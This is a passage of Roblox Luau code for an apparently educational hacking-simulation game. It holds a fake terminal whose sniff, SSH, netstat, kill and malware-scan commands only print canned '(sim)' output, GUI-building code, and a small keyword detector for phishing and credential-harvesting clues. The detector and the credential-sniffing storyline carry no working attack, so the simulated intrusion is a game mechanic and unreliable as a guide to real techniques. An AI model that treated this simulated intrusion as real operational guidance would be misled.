	startPacketCaptureForIP(target)
	addLine(("Sniffing %s (%s) ... (sim)"):format(host.label, host.ip))
	for i = 1, math.min(5, #ActivePacketCapture.rows) do
		local r = ActivePacketCapture.rows[i]
		addLine(("[%d] %s %s -> %s  dns=%s  port=%s  server=%s"):format(
			i, r.protocol, r.src, r.dst, r.dns, r.port, r.server
		))
	end
	addLine("Capture complete: targeted packets generated (sim)")
	terminalState.sniffCache = {
		host = host.label,
		ip = host.ip,
		server = "PlayerData_Vault",
		attackerIP = terminalState.lastAttackerIP,
	}
end

local function showPackets(target)
	target = target ~= "" and target or (terminalState.sniffCache and terminalState.sniffCache.ip or "192.168.32.12")
	local host = getHostByIP(target)
	if not host then
		addLine("packets: unknown target ip (sim)")
		return
	end
	startPacketCaptureForIP(target)
	addLine(("Packet Analyzer: %s (%s) (sim)"):format(host.label, host.ip))
	addLine(("Generated rows: %d"):format(#ActivePacketCapture.rows))
	addLine("Browser view: visit RBXPacketNet.com")
end

local function fakeConnect(target)
	target = target ~= "" and target or "192.168.43.20"
	local host = getHostByIP(target)
	if not host then
		addLine(("connect: cannot resolve %s (sim)"):format(target))
		return
	end
	addLine(("Resolving %s ... (sim)"):format(target))
	addLine(("Connected to %s [%s] (sim)"):format(host.label, host.ip))
	terminalState.connectedHost = host.label
end

local function fakeSSH(dest)
	dest = tostring(dest or "")
	if dest == "" then
		addLine("Try: ssh bloxplay-admin@192.168.43.20")
		return
	end

	local user, hostInput = dest:match("^([^@]+)@(.+)$")
	if not user or not hostInput then
		addLine("ssh: invalid destination. Try user@host")
		return
	end

	local host = getHostByIP(hostInput)
	if not host or host.label ~= "PlayerData_Vault" then
		addLine(("ssh: %s not available in simulation"):format(hostInput))
		return
	end

	addLine(("ssh: connecting to %s ... (sim)"):format(dest))
	if terminalState.sniffCache then
		addLine("Using credentials previously observed in traffic capture (sim)")
	end
	addLine("Host key fingerprint verified (sim)")
	addLine("Password accepted (sim)")
	addLine(("Welcome %s, connected to %s"):format(user, host.label))
	terminalState.currentHost = host.label
	terminalState.currentDir = "/"
	terminalState.sshSession = true
end

local function fakeExit()
	if terminalState.sshSession then
		addLine(("Connection to %s closed."):format(terminalState.currentHost))
		terminalState.currentHost = "local"
		terminalState.currentDir = "/"
		terminalState.sshSession = false
	else
		addLine("No remote session active.")
	end
end

local function fakeNetstat()
	addLine(("Active connections on %s (sim)"):format(terminalState.currentHost))
	if terminalState.currentHost == "PlayerData_Vault" then
		addLine("tcp   0   0 192.168.43.20:22     192.168.32.12:49822   ESTABLISHED")
		addLine("tcp   0   0 192.168.43.20:443    203.44.18.77:8080     ESTABLISHED")
		addLine("tcp   0   0 192.168.43.20:3306   192.168.43.25:54011   TIME_WAIT")
		addLine("Finding: suspicious outbound connection to 203.44.18.77")
	else
		addLine("tcp   0   0 192.168.32.12:49210  192.168.43.20:443     ESTABLISHED")
		addLine("udp   0   0 192.168.32.10:5353   224.0.0.251:5353      LISTEN")
	end
end

local function fakePsrep()
	addLine(("PID   NAME                STATUS    HOST=%s"):format(terminalState.currentHost))
	for _, p in ipairs(getProcesses()) do
		addLine(("%-5d %-19s %s"):format(p.pid, p.name, p.status))
	end
	if terminalState.currentHost == "PlayerData_Vault" then
		addLine("Finding: PID 1337 looks suspicious (sim)")
	end
end

local function fakeKill(pidText)
	local pid = tonumber(pidText)
	if not pid then
		addLine("Try: kill <pid>")
		return
	end
	local processes = getProcesses()
	for i, p in ipairs(processes) do
		if p.pid == pid then
			addLine(("Terminated PID %d (%s) (sim)"):format(pid, p.name))
			table.remove(processes, i)
			return
		end
	end
	addLine(("kill: %d: no such process (sim)"):format(pid))
end

local function fakePasswd(pw)
	local s = tostring(pw or "")
	if s == "" then
		addLine("Try: passwd NewStrongPass123!")
		return
	end

	local score = 0
	if #s >= 12 then score += 2 elseif #s >= 8 then score += 1 end
	if s:match("%d") then score += 1 end
	if s:match("%l") and s:match("%u") then score += 1 end
	if s:match("[%p%W_]") then score += 1 end

	if score <= 1 then
		addLine("passwd (sim): weak password rejected")
	elseif score <= 3 then
		addLine("passwd (sim): acceptable, but could be stronger")
	else
		addLine("passwd (sim): password updated successfully")
	end
end

local function fakeGrep(pattern, file)
	pattern = tostring(pattern or "")
	file = tostring(file or "")
	if pattern == "" or file == "" then
		addLine('Try: grep "Failed login" auth.log')
		return
	end

	local contents = getContents()
	local text = contents[pathLeaf(file)]
	if not text then
		addLine(("grep: %s: No such file (sim)"):format(file))
		return
	end

	local found = false
	for line in tostring(text):gmatch("[^\n]+") do
		if line:lower():find(pattern:lower(), 1, true) then
			addLine(line)
			found = true
		end
	end

	if not found then
		addLine("No matches found (sim)")
	end
end

local function fakeMalwareScan()
	addLine(("Malware scanner on %s (sim)"):format(terminalState.currentHost))
	if terminalState.currentHost == "PlayerData_Vault" then
		addLine("Alert: sync_jobs.sh flagged as suspicious exfiltration utility")
		addLine("IOC: outbound endpoint 203.44.18.77")
		addLine("Recommended actions: kill 1337, rm sync_jobs.sh, passwd <new>")
	else
		addLine("No malware indicators found on local tablet (sim)")
	end
end

local function showDevices()
	addLine("Known devices (SIM):")
	for _, host in ipairs(getAllHostsList()) do
		addLine(("%s  ip=%s  mac=%s  role=%s  service=%s"):format(
			host.label, host.ip, host.mac, host.role, host.server
		))
	end
end

local function showMac(target)
	target = tostring(target or "")
	if target == "" then
		addLine("Try: mac <ip>")
		return
	end
	local host = getHostByIP(target)
	if not host then
		addLine("mac: unknown ip (sim)")
		return
	end
	addLine(("%s  ip=%s  mac=%s"):format(host.label, host.ip, host.mac))
end

local function phishCheck(text)
	local t = (text or ""):lower()
	local flags = 0
	local clues = {}

	local function flag(clue)
		flags += 1
		table.insert(clues, "- " .. clue)
	end

	if t:find("urgent") or t:find("immediately") then flag("It tries to rush you.") end
	if t:find("password") or t:find("verify") then flag("It asks for credentials or account verification.") end
	if t:find("free") or t:find("winner") or t:find("prize") then flag("It offers a too-good-to-be-true reward.") end
	if t:find("gift card") then flag("Gift card request is a common scam sign.") end
	if t:find("click") and (t:find("link") or t:find("http")) then flag("It pushes you to click a link.") end

	if flags == 0 then
		addLine("baitcheck (sim): message looks calmer, but still verify the sender.")
	else
		addLine(("baitcheck (sim): %d suspicious clue(s) found:"):format(flags))
		for _, c in ipairs(clues) do
			addLine(c)
		end
	end
end

local function decoyMail(text)
	local t = (text or ""):lower()
	addLine("decoymail (sim): message tone analysis")
	if t == "" then
		addLine('Try: decoymail "URGENT verify your account now"')
		return
	end
	if t:find("urgent") or t:find("verify") or t:find("reset") then
		addLine("- Pressure language detected")
		addLine("- Credential harvest risk elevated")
	else
		addLine("- No strong pressure wording detected")
	end
	if t:find("admin") or t:find("security") then
		addLine("- Impersonation of authority possible")
	end
end

local function fakeCrackNG(target)
	target = tostring(target or "")
	if target == "" then
		addLine("Try: crack-ng 192.168.32.10")
		return
	end
	addLine(("crack-ng audit target=%s (sim only)"):format(target))
	if target == "192.168.32.10" or target == "192.168.43.2" then
		addLine("- weak segmentation policy found")
		addLine("- offline audit result: admin traffic overlaps with user network patterns")
		addLine("- recommendation: rotate credentials and separate wireless domains")
	else
		addLine("- no weak password policy found in simulation")
	end
end

local function showHelp()
	addLine("HackOS SIM commands:")
	addLine("help                          - show this list")
	addLine("apps                          - list apps")
	addLine("open <terminal|browser|notes> - switch screens")
	addLine("visit <url|home|tips|apps>    - open a page (sim)")
	addLine("scan [nearby|ip]              - scan nearby devices/host (sim)")
	addLine("sniff [ip]                    - capture fake packet traffic (sim)")
	addLine("packets [ip]                  - packet analyzer summary (sim)")
	addLine("devices                       - list devices + MACs (terminal only)")
	addLine("mac <ip>                      - show MAC for device")
	addLine("connect <ip>                  - simulate network access (sim)")
	addLine("ssh <user@ip>                 - simulate SSH login")
	addLine("exit                          - leave simulated SSH session")
	addLine("netstat                       - show fake network sessions")
	addLine("psrep                         - list simulated processes")
	addLine('grep "<term>" <file>          - search inside simulated logs')
	addLine("malwarescan                   - simulate malware scan")
	addLine("kill <pid>                    - terminate simulated process")
	addLine("ls [path]                     - list simulated files")
	addLine("cat <file>                    - read simulated file")
	addLine("openfile <file>               - open simulated file")
	addLine("closefile <file>              - close simulated file")
	addLine("echo <text>                   - print text")
	addLine("rm <file>                     - remove simulated file")
	addLine("passwd <text>                 - password set/check (sim)")
	addLine("baitcheck <text>              - detect phishing clues (sim)")
	addLine("decoymail <text>              - inspect suspicious email tone (sim)")
	addLine("crack-ng <target>             - password policy audit (sim)")
	addLine("admin <on|off>                - toggle admin mode (sim)")
	addLine("save | load                   - save/load progress")
	addLine("clear                         - clear terminal")
	addLine("time                          - show time")
	addLine("Browser links: hackos://home, bloxplay.com/admin, RBXPacketNet.com")
end

local function handle(cmdLine)
	local raw = tostring(cmdLine or ""):gsub("^%s+", ""):gsub("%s+$", "")
	addLine(PROMPT .. raw)

	local args = {}
	for w in raw:gmatch("%S+") do
		args[#args + 1] = w
	end
	local cmd = (args[1] or ""):lower()

	if cmd == "" then
		addLine(PROMPT)
		return
	end

	local function rest(from)
		local t = {}
		for i = from, #args do
			t[#t + 1] = args[i]
		end
		return table.concat(t, " ")
	end

	local function parseQuotedAndFile(input)
		local pat, file = input:match('^%s*"(.-)"%s+(.+)$')
		if pat and file then return pat, file end
		local a, b = input:match("^(%S+)%s+(.+)$")
		return a, b
	end

	if cmd == "help" then
		showHelp()
	elseif cmd == "apps" then
		addLine("Apps (SIM): terminal, browser, notes (soon), RBXPacketNet, admin portal")
		addLine("Tip: open browser")
	elseif cmd == "open" then
		local which = (args[2] or ""):lower()
		if which == "terminal" then
			TermFrame.Visible = true
			BrowserFrame.Visible = false
			MissionsFrame.Visible = false
			if TermInput then TermInput:CaptureFocus() end
			addLine("Switched to Terminal.")
		elseif which == "browser" then
			TermFrame.Visible = false
			BrowserFrame.Visible = true
			MissionsFrame.Visible = false
			if UrlBox and UrlBox.Text == "" then
				UrlBox.Text = "home"
				navigateTo("home")
			else
				navigateTo(UrlBox.Text)
			end
			pcall(function() UrlBox:CaptureFocus() end)
			addLine("Switched to Browser.")
		elseif which == "notes" then
			addLine("Notes app (sim) coming soon")
		else
			addLine("Try: open terminal OR open browser")
		end
	elseif cmd == "visit" then
		local target = rest(2)
		addLine("Opening " .. (target ~= "" and target or "about:blank") .. " ... (sim)")
		if UrlBox then UrlBox.Text = target end
		navigateTo(target)
	elseif cmd == "scan" then
		showScan(rest(2))
	elseif cmd == "sniff" then
		showSniff(rest(2))
	elseif cmd == "packets" then
		showPackets(rest(2))
	elseif cmd == "devices" then
		showDevices()
	elseif cmd == "mac" then
		showMac(args[2] or "")
	elseif cmd == "connect" then
		fakeConnect(rest(2))
	elseif cmd == "ssh" then
		fakeSSH(rest(2))
	elseif cmd == "exit" then
		fakeExit()
	elseif cmd == "netstat" then
		fakeNetstat()
	elseif cmd == "psrep" or (cmd == "ps" and (args[2] or "") == "aux") then
		fakePsrep()
	elseif cmd == "grep" then
		local pattern, file = parseQuotedAndFile(rest(2))
		fakeGrep(pattern, file)
	elseif cmd == "malwarescan" then
		fakeMalwareScan()
	elseif cmd == "kill" then
		fakeKill(args[2] or "")
	elseif cmd == "ls" then
		listPath(args[2] or "")
	elseif cmd == "cat" then
		catFile(rest(2))
	elseif cmd == "openfile" then
		openFile(rest(2))
	elseif cmd == "closefile" then
		closeFile(rest(2))
	elseif cmd == "echo" then
		addLine(rest(2))
	elseif cmd == "rm" then
		removeFile(rest(2))
	elseif cmd == "passwd" then
		fakePasswd(rest(2))
	elseif cmd == "baitcheck" then
		phishCheck(rest(2))
	elseif cmd == "decoymail" then
		decoyMail(rest(2))
	elseif cmd == "crack-ng" then
		fakeCrackNG(rest(2))
	elseif cmd == "admin" then
		local on = (args[2] or ""):lower() == "on"
		Player:SetAttribute("Obj_Admin", on)
		if on then
			browserState.adminLoggedIn = true
		end
		addLine("Admin mode (sim) = " .. tostring(on))
	elseif cmd == "save" then
		saveNow()
	elseif cmd == "load" then
		loadNow()
	elseif cmd == "time" then
		addLine(os.date("%Y-%m-%d %H:%M:%S"))
	elseif cmd == "clear" or cmd == "reset" then
		TermOut:ClearAllChildren()
		mk("UIListLayout", { Parent = TermOut, Name = "UIListLayout", Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder })
		addLine(PROMPT)
		return
	else
		addLine("I do not know that command. Type: help")
	end

	addLine(PROMPT)
end

local function pushHistory(cmd)
	cmd = tostring(cmd or ""):gsub("^%s+", ""):gsub("%s+$", "")
	if cmd == "" then return end
	if commandHistory[#commandHistory] ~= cmd then
		table.insert(commandHistory, cmd)
	end
	historyIndex = nil
	currentDraft = ""
end

local function historyUp()
	if #commandHistory == 0 or not TermInput then return end
	if historyIndex == nil then
		currentDraft = TermInput.Text
		historyIndex = #commandHistory
	else
		historyIndex = math.max(1, historyIndex - 1)
	end
	TermInput.Text = commandHistory[historyIndex] or ""
	TermInput.CursorPosition = #TermInput.Text + 1
end

local function historyDown()
	if #commandHistory == 0 or not TermInput then return end
	if historyIndex == nil then
		return
	end
	historyIndex += 1
	if historyIndex > #commandHistory then
		historyIndex = nil
		TermInput.Text = currentDraft or ""
	else
		TermInput.Text = commandHistory[historyIndex] or ""
	end
	TermInput.CursorPosition = #TermInput.Text + 1
end

local function buildQuickLink(parent, text, url, posX)
	local b = mk("TextButton", {
		Parent = parent,
		Text = text,
		Font = Enum.Font.GothamSemibold,
		TextSize = 12,
		TextColor3 = Color3.new(1, 1, 1),
		BackgroundColor3 = Color3.fromRGB(70, 96, 160),
		Size = UDim2.fromOffset(110, 24),
		Position = UDim2.new(0, posX, 0, 0),
	})
	round(b, 8)
	b.MouseButton1Click:Connect(function()
		navigateTo(url)
	end)
	return b
end

local function buildMainUI()
	local gui = mk("ScreenGui", {
		Parent = PlayerGui,
		Name = "TabletGUI",
		IgnoreGuiInset = true,
		ResetOnSpawn = false,
		Enabled = false,
	})

	local desktop = mk("Frame", {
		Parent = gui,
		Size = UDim2.fromScale(1, 1),
		BackgroundColor3 = Color3.fromRGB(10, 14, 22),
	})

	mk("UIGradient", {
		Parent = desktop,
		Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(23, 34, 58)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(7, 10, 16)),
		}),
		Rotation = 120,
	})

	local top = mk("Frame", {
		Parent = desktop,
		Size = UDim2.new(1, 0, 0, 50),
		BackgroundColor3 = Color3.fromRGB(17, 22, 32),
		BackgroundTransparency = 0.08,
	})

	mk("TextLabel", {
		Parent = top,
		BackgroundTransparency = 1,
		Text = "HackOS v1.4",
		Font = Enum.Font.GothamBold,
		TextSize = 16,
		TextColor3 = Color3.fromRGB(220, 236, 255),
		Position = UDim2.new(0, 14, 0, 0),
		Size = UDim2.fromOffset(180, 50),
		TextXAlignment = Enum.TextXAlignment.Left,
	})

	ClockLabel = mk("TextLabel", {
		Parent = top,
		BackgroundTransparency = 1,
		Text = "--:--:--",
		Font = Enum.Font.Code,
		TextSize = 15,
		TextColor3 = Color3.fromRGB(190, 208, 240),
		Position = UDim2.new(1, -170, 0, 0),
		Size = UDim2.fromOffset(160, 50),
		TextXAlignment = Enum.TextXAlignment.Right,
	})

	local function button(text, x, w)
		local b = mk("TextButton", {
			Parent = top,
			Text = text,
			Font = Enum.Font.GothamSemibold,
			TextSize = 14,
			TextColor3 = Color3.new(1, 1, 1),
			BackgroundColor3 = Color3.fromRGB(45, 57, 84),
			Size = UDim2.fromOffset(w or 92, 30),
			Position = UDim2.new(0, x, 0, 10),
		})
		round(b, 9)
		return b
	end

	local bTerm = button("Terminal", 180, 80)
	local bBrowser = button("Browser", 265, 80)
	local bMissions = button("Missions", 350, 80)
	local bSave = button("Save", 435, 72)
	local bLoad = button("Load", 512, 72)
	local bClose = button("Close", 589, 72)

	local pad = mk("Frame", {
		Parent = desktop,
		Position = UDim2.new(0, 14, 0, 64),
		Size = UDim2.new(1, -28, 1, -78),
		BackgroundColor3 = Color3.fromRGB(15, 19, 28),
		BackgroundTransparency = 0.1,
	})
	round(pad, 14)

	TermFrame = mk("Frame", {
		Parent = pad,
		BackgroundColor3 = Color3.fromRGB(11, 14, 18),
		Size = UDim2.new(0.52, -6, 1, -12),
		Position = UDim2.new(0, 6, 0, 6),
	})

	BrowserFrame = mk("Frame", {
		Parent = pad,
		BackgroundColor3 = Color3.fromRGB(236, 238, 243),
		Size = UDim2.new(0.48, -6, 1, -12),
		Position = UDim2.new(0.52, 0, 0, 6),
		Visible = false,
	})

	round(TermFrame, 12)
	round(BrowserFrame, 12)

	MissionsFrame = mk("Frame", {
		Parent = pad,
		BackgroundColor3 = Color3.fromRGB(15, 19, 28),
		Size = UDim2.new(1, -12, 1, -12),
		Position = UDim2.new(0, 6, 0, 6),
		Visible = false,
	})
	round(MissionsFrame, 12)

	mk("TextLabel", {
		Parent = MissionsFrame,
		BackgroundTransparency = 1,
		Text = " ACTIVE MISSIONS",
		Font = Enum.Font.GothamBlack,
		TextSize = 18,
		TextColor3 = Color3.fromRGB(220, 236, 255),
		Position = UDim2.new(0, 10, 0, 10),
		Size = UDim2.new(1, -20, 0, 30),
		TextXAlignment = Enum.TextXAlignment.Left,
	})

	MissionsList = mk("ScrollingFrame", {
		Parent = MissionsFrame,
		BackgroundColor3 = Color3.fromRGB(8, 10, 13),
		BorderSizePixel = 0,
		ScrollBarThickness = 6,
		Size = UDim2.new(1, -20, 1, -50),
		Position = UDim2.new(0, 10, 0, 40),
	})
	round(MissionsList, 10)
	mk("UIListLayout", {
		Parent = MissionsList,
		Name = "UIListLayout",
		Padding = UDim.new(0, 6),
		SortOrder = Enum.SortOrder.LayoutOrder,
	})

	TermOut = mk("ScrollingFrame", {
		Parent = TermFrame,
		BackgroundColor3 = Color3.fromRGB(8, 10, 13),
		BorderSizePixel = 0,
		ScrollBarThickness = 6,
		Size = UDim2.new(1, -16, 1, -78),
		Position = UDim2.new(0, 8, 0, 8),
	})
	round(TermOut, 10)
	mk("UIListLayout", {
		Parent = TermOut,
		Name = "UIListLayout",
		Padding = UDim.new(0, 4),
		SortOrder = Enum.SortOrder.LayoutOrder,
	})

	local h = UIS.TouchEnabled and 40 or 32
	TermInput = mk("TextBox", {
		Parent = TermFrame,
		Text = "",
		ClearTextOnFocus = false,
		PlaceholderText = "Type command... (Up/Down for history)",
		Font = Enum.Font.Code,
		TextSize = 16,
		TextColor3 = Color3.fromRGB(172, 255, 198),
		BackgroundColor3 = Color3.fromRGB(8, 10, 13),
		BorderSizePixel = 0,
		Size = UDim2.new(1, -(UIS.TouchEnabled and 112 or 16), 0, h),
		Position = UDim2.new(0, 8, 1, -(8 + h)),
	})
	round(TermInput, 9)

	if UIS.TouchEnabled then
		local run = mk("TextButton", {
			Parent = TermFrame,
			Text = "Run",
			Font = Enum.Font.GothamSemibold,
			TextSize = 16,
			TextColor3 = Color3.new(1, 1, 1),
			BackgroundColor3 = Color3.fromRGB(72, 126, 255),
			Size = UDim2.fromOffset(90, h),
			Position = UDim2.new(1, -98, 1, -(8 + h)),
		})
		round(run, 9)
		run.MouseButton1Click:Connect(function()
			local c = TermInput.Text
			TermInput.Text = ""
			pushHistory(c)
			handle(c)
			task.defer(function()
				if TermInput and TermInput.Parent and TermFrame.Visible then
					TermInput:CaptureFocus()
				end
			end)
		end)
	end

	UrlBox = mk("TextBox", {
		Parent = BrowserFrame,
		Text = "",
		PlaceholderText = "home (or type a URL)",
		Font = Enum.Font.Gotham,
		TextSize = 15,
		TextColor3 = Color3.new(0, 0, 0),
		BackgroundColor3 = Color3.fromRGB(223, 227, 236),
		Size = UDim2.new(1, -88, 0, 32),
		Position = UDim2.new(0, 8, 0, 8),
	})
	round(UrlBox, 8)

	local goBtn = mk("TextButton", {
		Parent = BrowserFrame,
		Text = "GO",
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		TextColor3 = Color3.new(1, 1, 1),
		BackgroundColor3 = Color3.fromRGB(79, 131, 255),
		Size = UDim2.fromOffset(64, 32),
		Position = UDim2.new(1, -72, 0, 8),
	})
	round(goBtn, 8)

	BrowserStatusLabel = mk("TextLabel", {
		Parent = BrowserFrame,
		BackgroundTransparency = 1,
		Text = "",
		Font = Enum.Font.Gotham,
		TextSize = 12,
		TextColor3 = Color3.fromRGB(70, 82, 100),
		TextXAlignment = Enum.TextXAlignment.Left,
		Position = UDim2.new(0, 8, 0, 42),
		Size = UDim2.new(1, -16, 0, 18),
	})

	LinkBar = mk("Frame", {
		Parent = BrowserFrame,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 8, 0, 62),
		Size = UDim2.new(1, -16, 0, 24),
	})
	buildQuickLink(LinkBar, "HackOS Home", "hackos://home", 0)
	buildQuickLink(LinkBar, "PacketNet", "rbxpacketnet.com", 118)
	buildQuickLink(LinkBar, "Admin Portal", "bloxplay.com/admin", 236)

	BrowserContent = mk("Frame", {
		Parent = BrowserFrame,
		BackgroundColor3 = Color3.fromRGB(250, 251, 253),
		BorderSizePixel = 0,
		Position = UDim2.new(0, 8, 0, 92),
		Size = UDim2.new(1, -16, 1, -100),
	})
	round(BrowserContent, 10)

	PageLabel = mk("TextLabel", {
		Parent = BrowserContent,
		BackgroundTransparency = 1,
		TextWrapped = true,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextYAlignment = Enum.TextYAlignment.Top,
		Font = Enum.Font.Gotham,
		TextSize = 16,
		TextColor3 = Color3.new(0, 0, 0),
		Text = "",
		Size = UDim2.new(1, -16, 1, -16),
		Position = UDim2.new(0, 8, 0, 8),
		Visible = true,
	})

	AdminLoginPage = mk("Frame", {
		Parent = BrowserContent,
		BackgroundTransparency = 1,
		Size = UDim2.fromScale(1, 1),
		Visible = false,
	})

	mk("TextLabel", {
		Parent = AdminLoginPage,
		BackgroundTransparency = 1,
		Text = "BLOXPLAY ADMIN",
		Font = Enum.Font.GothamBlack,
		TextSize = 24,
		TextColor3 = Color3.fromRGB(28, 36, 52),
		Size = UDim2.new(1, 0, 0, 30),
		Position = UDim2.new(0, 0, 0, 18),
	})

	mk("TextLabel", {
		Parent = AdminLoginPage,
		BackgroundTransparency = 1,
		Text = "Authorized Personnel Login (SIM)",
		Font = Enum.Font.Gotham,
		TextSize = 14,
		TextColor3 = Color3.fromRGB(90, 100, 118),
		Size = UDim2.new(1, 0, 0, 20),
		Position = UDim2.new(0, 0, 0, 50),
	})

	AdminUserBox = mk("TextBox", {
		Parent = AdminLoginPage,
		Text = "",
		PlaceholderText = "username",
		Font = Enum.Font.Gotham,
		TextSize = 16,
		TextColor3 = Color3.new(0, 0, 0),
		BackgroundColor3 = Color3.fromRGB(233, 237, 244),
		BorderSizePixel = 0,
		Size = UDim2.new(0, 260, 0, 36),
		Position = UDim2.new(0.5, -130, 0, 95),
	})
	round(AdminUserBox, 8)

	AdminPassBox = mk("TextBox", {
		Parent = AdminLoginPage,
		Text = "",
		PlaceholderText = "password",
		Font = Enum.Font.Gotham,
		TextSize = 16,
		TextColor3 = Color3.new(0, 0, 0),
		BackgroundColor3 = Color3.fromRGB(233, 237, 244),
		BorderSizePixel = 0,
		Size = UDim2.new(0, 260, 0, 36),
		Position = UDim2.new(0.5, -130, 0, 139),
		ClearTextOnFocus = false,
		MultiLine = false,
		TextEditable = true,
	})
	round(AdminPassBox, 8)
	AdminPassBox:SetAttribute("RealPassword", "")

	local adminPassMasking = false
	AdminPassBox:GetPropertyChangedSignal("Text"):Connect(function()
		if adminPassMasking then return end

		local real = tostring(AdminPassBox:GetAttribute("RealPassword") or "")
		local shown = tostring(AdminPassBox.Text or "")

		if shown == real then
			real = shown
		elseif shown ~= string.rep("*", #real) then
			if #shown > #real then
				local added = shown:sub(#real + 1)
				real ..= added
			elseif #shown < #real then
				real = real:sub(1, #shown)
			end
		end

		AdminPassBox:SetAttribute("RealPassword", real)

		adminPassMasking = true
		local masked = string.rep("*", #real)
		if AdminPassBox.Text ~= masked then
			AdminPassBox.Text = masked
		end
		AdminPassBox.CursorPosition = #masked + 1
		adminPassMasking = false
	end)

	local adminLoginBtn = mk("TextButton", {
		Parent = AdminLoginPage,
		Text = "LOGIN",
		Font = Enum.Font.GothamBold,
		TextSize = 15,
		TextColor3 = Color3.new(1, 1, 1),
		BackgroundColor3 = Color3.fromRGB(76, 123, 255),
		Size = UDim2.new(0, 140, 0, 36),
		Position = UDim2.new(0.5, -70, 0, 188),
	})
	round(adminLoginBtn, 8)

	AdminLoginStatus = mk("TextLabel", {
		Parent = AdminLoginPage,
		BackgroundTransparency = 1,
		Text = "",
		Font = Enum.Font.Gotham,
		TextSize = 13,
		TextColor3 = Color3.fromRGB(90, 100, 118),
		Size = UDim2.new(1, -30, 0, 20),
		Position = UDim2.new(0, 15, 0, 233),
	})

	AdminDashboardPage = mk("Frame", {
		Parent = BrowserContent,
		BackgroundTransparency = 1,
		Size = UDim2.fromScale(1, 1),
		Visible = false,
	})

	mk("TextLabel", {
		Parent = AdminDashboardPage,
		BackgroundTransparency = 1,
		Text = "BLOXPLAY ADMIN DATABASE",
		Font = Enum.Font.GothamBlack,
		TextSize = 22,
		TextColor3 = Color3.fromRGB(28, 36, 52),
		Position = UDim2.new(0, 10, 0, 10),
		Size = UDim2.new(1, -20, 0, 28),
		TextXAlignment = Enum.TextXAlignment.Left,
	})

	AdminSearchBox = mk("TextBox", {
		Parent = AdminDashboardPage,
		Text = "",
		PlaceholderText = "Search staff or player data...",
		Font = Enum.Font.Gotham,
		TextSize = 14,
		TextColor3 = Color3.new(0, 0, 0),
		BackgroundColor3 = Color3.fromRGB(233, 237, 244),
		BorderSizePixel = 0,
		Position = UDim2.new(0, 10, 0, 46),
		Size = UDim2.new(1, -20, 0, 34),
	})
	round(AdminSearchBox, 8)

	AdminResultsFrame = mk("ScrollingFrame", {
		Parent = AdminDashboardPage,
		BackgroundColor3 = Color3.fromRGB(238, 242, 248),
		BorderSizePixel = 0,
		ScrollBarThickness = 6,
		Position = UDim2.new(0, 10, 0, 88),
		Size = UDim2.new(1, -20, 1, -98),
	})
	round(AdminResultsFrame, 8)
	mk("UIListLayout", {
		Parent = AdminResultsFrame,
		Name = "UIListLayout",
		Padding = UDim.new(0, 6),
		SortOrder = Enum.SortOrder.LayoutOrder,
	})

	PacketPage = mk("Frame", {
		Parent = BrowserContent,
		BackgroundTransparency = 1,
		Size = UDim2.fromScale(1, 1),
		Visible = false,
	})

	mk("TextLabel", {
		Parent = PacketPage,
		BackgroundTransparency = 1,
		Text = "RBXPacketNet",
		Font = Enum.Font.GothamBlack,
		TextSize = 24,
		TextColor3 = Color3.fromRGB(30, 40, 58),
		Position = UDim2.new(0, 10, 0, 10),
		Size = UDim2.new(1, -20, 0, 28),
		TextXAlignment = Enum.TextXAlignment.Left,
	})

	mk("TextLabel", {
		Parent = PacketPage,
		BackgroundTransparency = 1,
		Text = "Targeted Packet Capture (SIM)",
		Font = Enum.Font.Gotham,
		TextSize = 13,
		TextColor3 = Color3.fromRGB(88, 98, 114),
		Position = UDim2.new(0, 10, 0, 36),
		Size = UDim2.new(1, -20, 0, 18),
		TextXAlignment = Enum.TextXAlignment.Left,
	})

	PacketToolbar = mk("Frame", {
		Parent = PacketPage,
		BackgroundColor3 = Color3.fromRGB(233, 237, 244),
		BorderSizePixel = 0,
		Position = UDim2.new(0, 10, 0, 62),
		Size = UDim2.new(1, -20, 0, 42),
	})
	round(PacketToolbar, 8)

	PacketIPBox = mk("TextBox", {
		Parent = PacketToolbar,
		Text = "",
		PlaceholderText = "Target IP (e.g. 192.168.32.12)",
		Font = Enum.Font.Gotham,
		TextSize = 13,
		TextColor3 = Color3.new(0, 0, 0),
		BackgroundColor3 = Color3.fromRGB(248, 250, 253),
		BorderSizePixel = 0,
		Position = UDim2.new(0, 8, 0, 6),
		Size = UDim2.new(0, 160, 0, 30),
	})
	round(PacketIPBox, 8)

	PacketDNSBox = mk("TextBox", {
		Parent = PacketToolbar,
		Text = "",
		PlaceholderText = "DNS/Server filter",
		Font = Enum.Font.Gotham,
		TextSize = 13,
		TextColor3 = Color3.new(0, 0, 0),
		BackgroundColor3 = Color3.fromRGB(248, 250, 253),
		BorderSizePixel = 0,
		Position = UDim2.new(0, 176, 0, 6),
		Size = UDim2.new(0, 132, 0, 30),
	})
	round(PacketDNSBox, 8)

	PacketApplyBtn = mk("TextButton", {
		Parent = PacketToolbar,
		Text = "Capture",
		Font = Enum.Font.GothamSemibold,
		TextSize = 13,
		TextColor3 = Color3.new(1, 1, 1),
		BackgroundColor3 = Color3.fromRGB(79, 131, 255),
		Position = UDim2.new(1, -180, 0, 6),
		Size = UDim2.new(0, 60, 0, 30),
	})
	round(PacketApplyBtn, 8)

	PacketClearBtn = mk("TextButton", {
		Parent = PacketToolbar,
		Text = "Clear",
		Font = Enum.Font.GothamSemibold,
		TextSize = 13,
		TextColor3 = Color3.new(1, 1, 1),
		BackgroundColor3 = Color3.fromRGB(110, 120, 145),
		Position = UDim2.new(1, -114, 0, 6),
		Size = UDim2.new(0, 52, 0, 30),
	})
	round(PacketClearBtn, 8)

	PacketFollowBtn = mk("TextButton", {
		Parent = PacketToolbar,
		Text = "Follow",
		Font = Enum.Font.GothamSemibold,
		TextSize = 13,
		TextColor3 = Color3.new(1, 1, 1),
		BackgroundColor3 = Color3.fromRGB(76, 168, 110),
		Position = UDim2.new(1, -56, 0, 6),
		Size = UDim2.new(0, 48, 0, 30),
	})
	round(PacketFollowBtn, 8)

	PacketListFrame = mk("ScrollingFrame", {
		Parent = PacketPage,
		BackgroundColor3 = Color3.fromRGB(233, 237, 244),
		BorderSizePixel = 0,
		ScrollBarThickness = 6,
		Position = UDim2.new(0, 10, 0, 112),
		Size = UDim2.new(1, -20, 1, -122),
	})
	round(PacketListFrame, 8)
